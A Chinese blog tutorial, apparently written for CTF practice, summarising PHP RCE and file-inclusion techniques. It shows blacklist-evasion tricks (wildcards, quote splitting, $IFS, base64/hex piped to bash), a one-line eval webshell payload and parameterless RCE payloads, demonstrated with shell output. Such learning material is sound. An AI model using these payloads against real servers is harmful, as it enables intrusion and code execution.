class="toc-text">自定义环境变量绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%A7%BF%E5%8A%BF"><span class="toc-number">6.</span> <span class="toc-text">文件包含姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.1.</span> <span class="toc-text">无限制本地文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.1.1.</span> <span class="toc-text">data伪协议文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filter%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.1.2.</span> <span class="toc-text">filter协议文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#input%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.1.3.</span> <span class="toc-text">input协议文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">6.1.4.</span> <span class="toc-text">获取敏感文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.2.</span> <span class="toc-text">有限制本地文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.2.1.</span> <span class="toc-text">%00截断文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.2.2.</span> <span class="toc-text">路径长度截断文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.2.3.</span> <span class="toc-text">点号截断文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#require-once-%E7%BB%95%E8%BF%87%E4%B8%8D%E8%83%BD%E9%87%8D%E5%A4%8D%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">6.2.4.</span> <span class="toc-text">require_once 绕过不能重复包含文件的限制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.3.</span> <span class="toc-text">日志文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.3.1.</span> <span class="toc-text">中间件日志文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.3.2.</span> <span class="toc-text">SSH日志文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.4.</span> <span class="toc-text">session文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Session%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">6.4.1.</span> <span class="toc-text">Session的工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BAsession%E6%96%87%E4%BB%B6%E5%91%A2%E3%80%82"><span class="toc-number">6.4.2.</span> <span class="toc-text">如何创建session文件呢。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">6.4.3.</span> <span class="toc-text">攻击步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E9%99%90%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.5.</span> <span class="toc-text">无限制远程文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E9%99%90%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.6.</span> <span class="toc-text">有限制远程文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E9%97%AE%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">6.6.1.</span> <span class="toc-text">通过问号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%BA%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">6.6.2.</span> <span class="toc-text">通过井号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">6.6.3.</span> <span class="toc-text">通过空格绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8pearcmd-php%E4%BB%8ELFI%E5%88%B0getshell"><span class="toc-number">6.7.</span> <span class="toc-text">利用pearcmd.php从LFI到getshell</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        对于RCE和文件包含的一点总结
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wanTh3flag</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="3025-04-16T03:27:31.000Z" class="dt-published" itemprop="datePublished">3025-04-16</time>
        
        (Updated: <time datetime="2025-09-03T08:05:08.138Z" class="dt-updated" itemprop="dateModified">2025-09-03</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/">对于RCE和文件包含的一点总结</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/RCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">RCE和文件包含</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="什么是RCE"><a href="#什么是RCE" class="headerlink" title="什么是RCE"></a>什么是RCE</h1><p>RCE漏洞，即远程代码漏洞和远程命令执行漏洞，这种漏洞允许攻击者在后台服务器上远程注入操作系统命令或代码，从而控制后台系统。</p>
<p>在很多Web应用中，<strong>开发人员</strong>会使用一些<strong>特殊函数</strong>，这些函数以一些字符串作为输入，功能是将输入的字符串当作<strong>代码</strong>或者<strong>命令</strong>来进行执行。当<strong>用户</strong>可以控制这些函数的输入时（当应用程序未正确<strong>验证</strong>、<strong>过滤</strong>或<strong>限制</strong>用户输入时），就产生了RCE漏洞。</p>
<h1 id="分类-远程代码和远程命令"><a href="#分类-远程代码和远程命令" class="headerlink" title="分类(远程代码和远程命令)"></a><strong>分类(远程代码和远程命令)</strong></h1><p>1.命令执行漏洞：直接调用操作系统命令。例如，当Web应用在调用一些能将字符串转化成代码的函数时，如果未对用户输入进行合适的处理，可能造成命令执行漏洞。</p>
<p>2.代码执行漏洞：靠执行脚本代码调用操作系统命令。例如，PHP中的system()、exec()和passthru()函数，如果未对用户输入进行过滤或过滤不严，可能导致代码执行漏洞。</p>
<p>额外的:</p>
<p>3.系统的漏洞造成命令注入：例如bash破壳漏洞（CVE-2014-6271）是一个远程命令执行（RCE）漏洞。这个漏洞存在于Bash shell中，使得攻击者可以通过构造特定的环境变量值来执行任意命令，从而获取系统的控制权。。</p>
<p>4.调用的第三方组件存在代码执行漏洞：例如WordPress中用来处理图片的ImageMagick组件，以及JAVA中的命令执行漏洞（如struts2、ElasticsearchGroovy等）。</p>
<h1 id="RCE漏洞产生的条件"><a href="#RCE漏洞产生的条件" class="headerlink" title="RCE漏洞产生的条件"></a>RCE漏洞产生的条件</h1><ol>
<li>存在可调用执行命令的函数</li>
<li>函数参数可控</li>
<li>应用程序未正确<strong>验证</strong>、<strong>过滤</strong>或<strong>限制</strong>用户输入</li>
</ol>
<h1 id="RCE绕过bypass姿势"><a href="#RCE绕过bypass姿势" class="headerlink" title="RCE绕过bypass姿势"></a>RCE绕过bypass姿势</h1><p>先说说一些命令函数</p>
<h2 id="php执行系统命令函数"><a href="#php执行系统命令函数" class="headerlink" title="php执行系统命令函数"></a><strong>php执行系统命令函数</strong></h2><ul>
<li>system : 执行外部程序，并且显示输出，如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。如果要获取一个命令未经任何处理的 原始输出， 请使用 passthru() 函数。</li>
<li>exec ： 执行一个外部程序,回显最后一行,需要用echo输出。</li>
<li>shell_exec ： 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</li>
<li>popen ： 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</li>
<li>proc_open ： 执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</li>
<li>passthru ： 执行外部程序并且显示原始输出。同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image&#x2F;gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</li>
<li>pcntl_exec() ： 在当前进程空间执行指定程序，当发生错误时返回 false ，没有错误时没有返回。</li>
<li>&#96;（反引号）：同 shell_exec()</li>
</ul>
<h2 id="绕过关键字黑名单"><a href="#绕过关键字黑名单" class="headerlink" title="绕过关键字黑名单"></a>绕过关键字黑名单</h2><p>绕过文件名</p>
<ul>
<li>通配符绕过</li>
</ul>
<table>
<thead>
<tr>
<th>*</th>
<th>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个）</th>
</tr>
</thead>
<tbody><tr>
<td>?</td>
<td>匹配任何一个字符（不在括号内时）?代表任意1个字符</td>
</tr>
<tr>
<td>[abcd]</td>
<td>匹配指定字符范围内的任意单个字符</td>
</tr>
<tr>
<td>[a-z]</td>
<td>表示范围a到z，表示范围的意思</td>
</tr>
</tbody></table>
<p>配符是由shell处理的, 它只会出现在 命令的“参数”里。当shell在“参数”中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换(路径扩展)；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。总之，通配符实际上就是一种shell实现的路径扩展功能。在 通配符被处理后, shell会先完成该命令的重组，然后再继续处理重组后的命令，直至执行该命令。</p>
<p>例如我们的flag.php文件，我们可以用fla*或者fla?????去进行模糊匹配，但是这里需要注意，如果目录中有flax这种类似也可以匹配上的文件，系统可能会无法正确做出匹配或者返回多个可以匹配上的文件，例如我们设置一个1.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1????</span><br><span class="line">123</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1*</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p>如果我们加上一个1.php文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# vim 1.php</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1*</span><br><span class="line">1</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<ul>
<li>单引号双引号反引号绕过</li>
</ul>
<p>对php来说这是fl””ag而不是flag关键字不会匹配上，但是对于linux系统来说cat &#x2F;fl””ag等效于cat &#x2F;flag。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\进行转义，避免报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# ca&#x27;&#x27;t 1.txt </span><br><span class="line">123</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# ca&quot;&quot;t 1.txt </span><br><span class="line">123</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# ca``t 1.txt </span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<ul>
<li>反斜杠绕过</li>
</ul>
<p>linux看到反斜线\会自动帮你去掉,正常执行命令</p>
<p>例如<code>ca\t 1.php</code></p>
<ul>
<li>$1到$9、$@和$*绕过</li>
</ul>
<p>由于这些变量输出都为空，因此可以作为空格绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1$1.php</span><br><span class="line">1</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1$9.php</span><br><span class="line">1</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1$@.php</span><br><span class="line">1</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1$*.php</span><br><span class="line">1 </span><br></pre></td></tr></table></figure>

<ul>
<li>变量拼接绕过</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=a;c=t;$a$b$c //拼接</span><br><span class="line">例如</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# a=c;b=a;c=t;</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# $a$b$c 1.php</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<ul>
<li>利用base编码绕过</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;(base64编码)&#x27; | base64 -d | bash</span><br><span class="line">这里利用了管道符去逐个执行我们的命令，先base64编码输出，然后通过|管道符把上一个的输出作为下一个的输入，也就是base64 -d的输入，其中-d代表着解码，之后再把解码的内容传给bash，解码后的内容会被当成bash命令去执行</span><br><span class="line">例如</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# echo &#x27;Y2F0IDEucGhw&#x27; | base64 -d | bash</span><br><span class="line">1</span><br><span class="line">其中Y2F0IDEucGhw解码后是cat 1.php</span><br><span class="line">当然这里也不一定需要bash，也可以直接用反引号内联执行</span><br><span class="line">`echo &#x27;Y2F0IDEucGhw&#x27; | base64 -d`</span><br></pre></td></tr></table></figure>

<ul>
<li>利用hex编码绕过</li>
</ul>
<p>在Linux中，可以使用<code>xxd</code>命令对十六进制（hex）进行解码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;(hex编码)&#x27; | xxd -r -p | bash</span><br><span class="line">例如</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# echo &#x27;63 61 74 20 31 2e 70 68 70&#x27; | xxd -r -p | bash</span><br><span class="line">1</span><br><span class="line">其中63 61 74 20 31 2e 70 68 70就是cat 1.php的hex编码</span><br></pre></td></tr></table></figure>

<h2 id="特殊命令替换绕过"><a href="#特殊命令替换绕过" class="headerlink" title="特殊命令替换绕过"></a>特殊命令替换绕过</h2><h3 id="读文件命令cat"><a href="#读文件命令cat" class="headerlink" title="读文件命令cat"></a>读文件命令cat</h3><p>more：</p>
<ul>
<li>用于分页查看文件内容。</li>
<li>支持通过空格键向下翻页，b键向上翻页，q键退出查看。</li>
<li>还可以搜索指定文本，并支持设置每屏显示的行数。</li>
</ul>
<p>less：</p>
<ul>
<li>类似于more，但功能更强大。</li>
<li>支持方向键上下滚动，空格向下翻页，b向上翻页。</li>
<li>可以显示行号，支持搜索指定字符串，并可以方便地查找和浏览文件内容。</li>
<li>使用q键退出查看。</li>
</ul>
<p>head：</p>
<ul>
<li>用于查看文件的开头部分。</li>
<li>默认显示文件的前10行，但可以通过指定参数来显示更多或更少的行数或字节数。</li>
<li>支持与其他命令结合使用，如管道命令。</li>
</ul>
<p>sort：</p>
<ul>
<li>用于对文本文件内容进行排序。</li>
<li>支持多种排序方式，如按字母、数字、逆序排序等。</li>
<li>还可以合并已排序的文件，删除重复行，以及检查文件是否已经排序。</li>
</ul>
<p>tail：</p>
<ul>
<li>用于显示文件的末尾内容。</li>
<li>默认显示文件的最后10行，但可以通过指定参数来显示更多行数。</li>
<li>支持实时追踪文件的变化，并持续显示新增的内容，适用于查看日志文件等动态更新的文件。</li>
</ul>
<p>tac:</p>
<ul>
<li>从最后一行开始显示，可以看成 tac 是 cat 的反向显示</li>
</ul>
<h2 id="空格的绕过"><a href="#空格的绕过" class="headerlink" title="空格的绕过"></a>空格的绕过</h2><ul>
<li>大括号</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">在大括号中逗号会被看成是分隔符</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# &#123;cat,1.php&#125;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<ul>
<li>环境变量$IFS</li>
</ul>
<p>在Linux中有一个环境变量叫IFS，为内部字段分隔符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$IFS$9 (1-9)</span><br><span class="line">$&#123;IFS&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>&#123;&#125;</code>是为了固定变量名，如果直接用$IFS的话可能会导致后面的内容一部分被当成环境变量名进行解析</p>
<p>$IFS$9后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat$&#123;IFS&#125;1.php</span><br><span class="line">1</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat$IFS1.php</span><br><span class="line">cat.php: command not found</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat$IFS$11.php</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>这里就可以看到我们第二种是错误的</p>
<ul>
<li>重定向字符&lt;，&lt;&gt;</li>
</ul>
<p>重定向符号在Linux或Unix系统中用于控制命令的输入和输出。它可以将命令的输出发送到文件或从文件中获取输入。</p>
<p>**<code>&lt;</code>**：从文件中获取输入，将文件内容作为命令的标准输入。</p>
<p>**<code>&gt;</code>**：将命令的标准输出重定向到文件，如果文件不存在则创建，如果文件已存在则覆盖其内容。</p>
<ul>
<li>编码字符绕过（在linux下不可行，需要在php环境下）</li>
</ul>
<p>用%09，%20等可以表示成空的编码字符进行绕过</p>
<h1 id="RCE命令执行的姿势"><a href="#RCE命令执行的姿势" class="headerlink" title="RCE命令执行的姿势"></a>RCE命令执行的姿势</h1><h2 id="写入一句话木马"><a href="#写入一句话木马" class="headerlink" title="写入一句话木马"></a>写入一句话木马</h2><p>对于<code>eval($a)</code>因为在eval函数中的语句都会被当成php代码去执行</p>
<p>所以我们传入<code>$a=eval($_GET[1]);&amp;1=phpinfo();</code>会发现可以成功执行phpinfo</p>
<h2 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h2><p><code>&lt;?= ?&gt;</code> 是 PHP 中的一种短标签，用于快速输出变量或表达式的值。这种标签是 <code>&lt;?php echo ?&gt;</code> 的简写形式。</p>
<p>利用短标签可以绕过对php的检查</p>
<h2 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h2><p>在 PHP 中，反引号（&#96;&#96;）主要用于执行系统命令。使用反引号包围命令时，PHP 将会在操作系统上执行该命令，并返回命令的输出结果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如</span><br><span class="line">`tac fla*`就是执行tac fla*的命令，然后将命令的结果返回</span><br></pre></td></tr></table></figure>

<h2 id="关于eval中有echo的限制"><a href="#关于eval中有echo的限制" class="headerlink" title="关于eval中有echo的限制"></a>关于eval中有echo的限制</h2><p>这个思路起源于web41，源代码是这样的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这时候我们如果直接传入php代码的话会发现他会全部输出而不是执行代码，并且这里是放入这个<code>$c</code>变量而不是直接拼接，导致了我无法使用闭合去绕过echo，此时我就想到了一个关于函数调用符号<code>()</code>的一个优先级问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (system)(<span class="string">&#x27;whoami&#x27;</span>); </span><br></pre></td></tr></table></figure>

<p>此时会发现居然执行了whoami命令，这是因为函数调用操作符会将字符串 <code>&quot;system&quot;</code> 转换为可调用的函数，例如我们用phpinfo也是一样的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (phpinfo)();</span><br></pre></td></tr></table></figure>

<p>所以这个思路也是一个可以绕过echo的思路</p>
<h2 id="eval中无参数RCE"><a href="#eval中无参数RCE" class="headerlink" title="eval中无参数RCE"></a>eval中无参数RCE</h2><p>假如我们有下面这段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正则表达式 <code>[^\W]+\((?R)?\)</code> 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。简而言之，无参数rce就是不使用参数，而只使用一个个函数最终达到目的。</p>
<p>这种情况下我们传入的函数只能是没有参数的函数例如phpinfo()这类的</p>
<p>什么是无参数呢？</p>
<p>顾名思义就是无参数的函数，只使用函数且函数不能带有参数，这里的最大限制在于我们选择的函数必须参数为空或者只有一个参数，此时内层函数的返回值就可以作为外层函数的参数进行递归套用</p>
<p>php常用内置无参函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars() -  返回由所有已定义变量所组成的数组</span><br><span class="line">phpinfo() -显示php详细内容</span><br></pre></td></tr></table></figure>

<h3 id="查看当前目录文件名"><a href="#查看当前目录文件名" class="headerlink" title="查看当前目录文件名"></a>查看当前目录文件名</h3><p>最常见的就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(getcwd()))</span><br><span class="line">getchwd() 函数返回当前工作目录。不需要参数</span><br><span class="line">scandir() – 将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）需要参数</span><br></pre></td></tr></table></figure>

<h4 id="方法一：localeconv-函数"><a href="#方法一：localeconv-函数" class="headerlink" title="方法一：localeconv()函数"></a>方法一：localeconv()函数</h4><p>怎么构造参数里的小数点呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localeconv()函数：返回一个包含本地数字及货币格式信息的数组 第一个是.</span><br></pre></td></tr></table></figure>

<p>怎么获取到第一个数组的值(.)呢？</p>
<ul>
<li>最终的payload</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.print_r(scandir(current(localeconv())));</span><br><span class="line">2.print_r(scandir(pos(localeconv())));</span><br><span class="line">3.print_r(scandir(reset(localeconv())));</span><br></pre></td></tr></table></figure>

<p>current()函数：读取数组的第一个元素</p>
<p>print_r可以用var_dump代替,current可以用pos和reset代替</p>
<p>pos — current() 的别名</p>
<p>reset()该函数返回数组第一个单元的值，如果数组为空则返回 FALSE</p>
<p>我们举个例子</p>
<p>如果我们想要返回当前目录下的所有文件和目录，就需要用到scandir()函数，但是这个函数需要一个参数<code>$directory</code>去指定要扫描的目录路径。所以我们需要<code>scandir(&#39;.&#39;)</code> 函数调用会扫描当前目录，那么我们怎么去构造这个小数点呢？这里就需要用到能返回小数点的函数localeconv()，localeconv()的数组的第一个就是小数点，然后我们通过current()函数去读取数组的第一个元素，这样就能构造一个小数点，结合这些我们的payload构造就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scandir(current(localeconv()))</span><br></pre></td></tr></table></figure>

<p>然后使用一个输出函数去将结果输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(current(localeconv())))</span><br></pre></td></tr></table></figure>

<p>实操一下</p>
<p>先看一下localeconv下的数组内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=var_dump(localeconv());</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250307112128383.png" alt="image-20250307112128383"></p>
<p>可以看到第一个确实是小数点，我们试着返回这个小数点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=var_dump(current(localeconv()));</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250307112322248.png" alt="image-20250307112322248"></p>
<p>能返回小数点，那就试着读取一下当前目录</p>
